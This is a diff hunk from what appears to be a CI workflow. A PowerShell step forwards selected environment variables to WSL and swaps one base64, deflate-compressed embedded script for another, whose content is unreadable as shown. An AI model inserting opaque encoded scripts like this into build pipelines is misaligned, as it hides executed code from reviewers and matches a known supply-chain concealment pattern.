@@ -811,7 +811,7 @@ jobs:
           $processEnvironment = [System.Environment]::GetEnvironmentVariables('Process')
           $environmentNames = $allowedEnvironmentVariables | Where-Object { $processEnvironment.Contains($_) }
           $env:WSLENV = (($environmentNames | ForEach-Object { $value = [string]$processEnvironment[$_]; if ($pathVariableSet.Contains($_) -or $value -match '^(?:[A-Za-z]:[\\/]|\\\\)') { "$_/p" } else { $_ } }) -join ':')
-          $compressedScript = [System.Convert]::FromBase64String('nJDBSsNAEIbveYph2IMeYu5KCzFsswXdDc2uHkSGULLdSMgWdkvAkHcXrRakoOhpDjPzffx/Z+EJ0ldANm2MlHxDWqk7KvJC8Ot0Rni+gejaIQFot84Dnl0t2FQKyh/pbDMjLJeArFxrYW6JywdMbJdMJ9bxr85XnJTRldH1gl2Mod830UE6ArIvJr+vsp1LmzELjW39Ie4PMWSf8+ol+KHHS/wBTIWSq3VJVa7F3yRbP9hu9+H4RfGevP6HIXrfh5Ng/lbakY3J2wA=')
+          $compressedScript = [System.Convert]::FromBase64String('ykxTiFbQrVJQUqkOCvXzcw2KD/H394l3dnT2cLXSrVVSiLVWKMlIzeNSUEhNzshXUMJQZatS7e4R7xgejyFTq6RgZ6egpOLuGeIR6hTv6hemxJWWyVUNNwuiL9jRzTXePzQkIDQk2FZFo7w4pyCxJENBtxzZUa6+AbX66Rm6ieX6xYlpqfmlJQWlJcX6UFovqzg/L0dJUwmP0fHO/n5unu7xAY4hHqRak5yfl5aZDraFgCUg3weTZUdJfn5OMdyKWpSgg5iuxAUYAA==')
           $compressedStream = [System.IO.MemoryStream]::new($compressedScript)
           $decompressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Decompress)
           $reader = [System.IO.StreamReader]::new($decompressor, [System.Text.Encoding]::UTF8)
